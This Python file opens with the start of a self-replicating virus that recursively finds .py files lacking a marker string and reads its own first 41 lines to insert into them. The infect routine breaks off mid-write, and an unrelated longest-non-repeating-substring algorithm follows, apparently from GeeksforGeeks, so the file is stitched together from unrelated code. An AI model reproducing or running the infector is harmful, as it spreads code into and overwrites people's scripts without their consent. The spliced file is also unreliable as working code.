#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
# Python3 program to find the length
# of the longest substring
# without repeating characters
def longestUniqueSubsttr(string):

	# last index of every character
	last_idx = {}
	max_len = 0

	# starting index of current
	# window to calculate max_len
	start_idx = 0

	for i in range(0, len(string)):
	
		# Find the last index of str[i]
		# Update start_idx (starting index of current window)
		# as maximum of current value of start_idx and last
		# index plus 1
		if string[i] in last_idx:
			start_idx = max(start_idx, last_idx[string[i]] + 1)

		# Update result if we get a larger window
		max_len = max(max_len, i-start_idx + 1)

		# Update last index of current char.
		last_idx[string[i]] = i

	return max_len


# Driver program to test the above function
string = "geeksforgeeks"
print("The input string is " + string)
length = longestUniqueSubsttr(string)
print("The length of the longest non-repeating character" +
	" substring is " + str(length))
# Time Complexity: O(n+d) where n is the length of the input string and d is number of characters in input string alphabet
# Space Complexity: O(d)
